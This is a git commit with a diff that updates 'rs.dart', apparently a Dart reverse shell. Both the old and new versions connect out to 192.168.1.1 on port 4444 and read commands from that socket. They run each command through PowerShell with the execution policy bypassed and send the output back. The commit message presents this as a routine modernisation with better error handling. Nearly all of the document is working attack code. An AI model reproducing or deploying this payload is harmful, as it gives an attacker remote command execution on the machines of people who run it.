2f0be850b5659390bb46ce1dc640dddd6bb9181e
s-w-1-t-c-h <s-w-1-t-c-h@users.noreply.github.com>
2023-11-10 18:16:26 +1000

    Update rs.dart
    Rewritten to support latest version of dart.
    Fixed duplicate processes and improved error handling.

--- rs.dart
+++ rs.dart
@@ -1,19 +1,46 @@
-	import 'dart:io';
-	import 'dart:convert';
+import 'dart:io';
+import 'dart:convert';
 
-	main() {
-	  Socket.connect("192.168.1.1", 4444).then((socket) {
-		socket.write('[*] Incoming powershell...\n');
-		socket.listen((data) {
-		  Process.start('powershell.exe', ['-W', 'Hi', '-NoP', '-NonI', '-Ex', 'by']).then((Process process) {
-			process.stdin.writeln(new String.fromCharCodes(data).trim());
-			process.stdout
-			  .transform(utf8.decoder)
-			  .listen((output) { socket.write(output); socket.flush(); });
-		  });
-		},
-		onDone: () {
-		  socket.destroy();
-		});
-	  });
-	}
+void main() async {
+  try {
+    final socket = await Socket.connect("192.168.1.1", 4444);
+    print('[*] Connection established to ${socket.remoteAddress.address}:${socket.remotePort}');
+
+    socket.write('[*] Incoming PowerShell...\n[PS]> ');
+
+    await socket.forEach((List<int> data) async {
+      final command = utf8.decode(data).trim();
+
+      if (command.toLowerCase() == 'exit') {
+        socket.write('[*] Closing connection...\n');
+        socket.close();
+      } else {
+        await executePowerShellCommand(command, socket);
+        socket.write('[PS]> ');
+        socket.flush();
+      }
+    });
+
+  } catch (e) {
+    print('[ERROR] $e');
+  }
+}
+
+Future<void> executePowerShellCommand(String command, Socket socket) async {
+  try {
+    final process = await Process.start(
+      'powershell.exe',
+      ['-NoProfile', '-NonInteractive', '-ExecutionPolicy', 'Bypass', '-Command', command],
+    );
+
+    final output = await process.stdout.transform(utf8.decoder).join();
+    final errorOutput = await process.stderr.transform(utf8.decoder).join();
+
+    await process.exitCode;
+
+    socket.write('[*] Command output:\n$output\n');
+
+  } catch (e) {
+    socket.write('[ERROR] $e');
+  }
+}
